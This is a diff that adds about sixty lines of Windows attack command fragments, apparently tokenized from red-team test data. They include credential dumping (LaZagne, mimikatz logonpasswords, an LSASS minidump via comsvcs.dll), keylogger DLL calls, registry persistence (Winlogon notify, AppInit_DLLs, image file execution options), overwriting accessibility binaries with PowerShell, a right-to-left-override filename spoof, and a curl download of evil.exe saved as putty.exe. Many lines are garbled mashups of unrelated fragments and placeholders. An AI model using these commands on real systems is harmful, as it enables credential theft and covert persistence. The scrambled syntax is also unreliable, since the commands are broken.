@@ -1,0 +1,64 @@
+add-localgroupmember -group administrators '' $ } /d `` $ { service_name } /o
+python -c `` hklm\system\currentcontrolset\control\session -usebasicparsing ) ;
+lazagne.exe windows
+rundll32 keylogger_dll.dll , keylog
+reg add `` hkey_local_machine\system\currentcontrolset\services\ntds '' /v `` autodialdll '' '' 0 /d `` 1 , $ { clsid } , '
+at.exe $ $ { username } '' $ { system file }
+reg add `` hklm\software\microsoft\windows nt\currentversion\image file execution options\svchost.exe '' /v globalflag -name autorun '' , `` disable /failure : disable
+reg add `` domain c : \users\
+`` $ env $ user_name '' )
+ffuf -w $ { output_folder }
+reg `` nt\currentversion\windows '' `` .\ { domain }
+archive_file.exe $ { lsass_pid } }
+query user /server : # { driver_name }
+get-adgroupmember -identity `` hkey_local_machine\software\microsoft\windows nt\currentversion\winlogon '' `` $ { args } ''
+workfolders
+wscript $ { flie_name } abc‮xcod.scr
+/y $ code
+rundll32 keylogger_dll.dll , keylog
+get-childitem $ { seconds } = % \\ $ { copy \windows\system32\ } /user : $ { remote_host } -u $ { packet } in ( $ { range_step } ) { username= /interactive test-connection $ { ip_address } /krbtgt : '' $ { range_end }
+cscript $ { file_name } ''
+fltmc.exe unload $ { input_folder_name }
+$ env : cor_enable_profiling = 1
+wlrmdr.exe -s $ { file_name } , $ { computer_name }
+reg add `` hkcu\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' '' /v reg_dword /d -propertytype security packages '' /d `` $ { command } ''
+psexec.exe \\ $ { id as % \secrets -excludeproperty : \windows\system32\comsvcs.dll , minidump ( get-process -comobject ) /d $ { command } ''
+net group `` domain admins '' $ { username }
+c : \windows\system32\at.exe $ { new_time }
+`` put $ { malicious_exe_path } -d $ { ip }
+reg add `` hklm\software\microsoft\windows nt\currentversion\windows '' /v `` loadappinit_dlls '' '' /f
+namp -sn
+new-localuser -name `` $ { username } password= $ { command }
+rdrleakdiag.exe /p $ { target domain name )
+sc query
+$ shell.createshortcut ( = `` '' '' ) '' -class 325 '' '' `` exit ''
+rundll32.exe c : \windows\system32\desk.cpl , http : //192.168.1.29:9000/payload/evil.exe c : \windows\system32\comsvcs.dll -namespace /format : $ { packet } )
+curl http : //192.168.1.29:9000/payload/evil.exe -o .\putty.exe
+rundll32 keylogger_dll.dll , keylog
+new-localuser -name `` $ { username }
+hydra -l $ ( username )
+wevtutil | \\ $ { ip_address } '' $ { path }
+net `` -filepath '' /domain ''
+ren $ { password } command= '' $ { `` $ { / $ { temp % \ $ { format }
+net user $ { input_folder_name } $ { output_folder }
+net user /domain
+attrib +h $ : reply /d `` $ { vbs_script }
+open $ { docx }
+set programw6432= $ { title } \appdata\local\temp\lsass.dmp
+reg add `` hkcu\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' /t reg_dword /v `` enabled detailed , $ { attached } \windows rename
+net stop
+net user /domain
+net `` $ shortcut.save ( ) ''
+reg add `` hkcu\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' '' /v `` autodialdll '' /success : disable /failure : , disable
+sekurlsa : :logonpasswords
+pktmon.exe start -- etw
+nmap -sv -sc $ { registry_path }
+c : \windows\system32\at.exe $ { time } /interactive \ $ { path }
+net user defaultaccount = $ { reg_path }
+put $ { # consumerargs
+$ shortcut = `` '' '' ) -class tracking : \windows\system32\sethc.exe
+copy % % \system32\windowspowershell\v1.0\powershell.exe % \system32\osk.exe /y
+query user /server : # { # { computer_name } ''
+wlrmdr.exe -s $ { lsass_pid } /y
+set programw6432= $ { path }
+iediagcmd.exe /out : $ { \windows\system32\ } binpath=
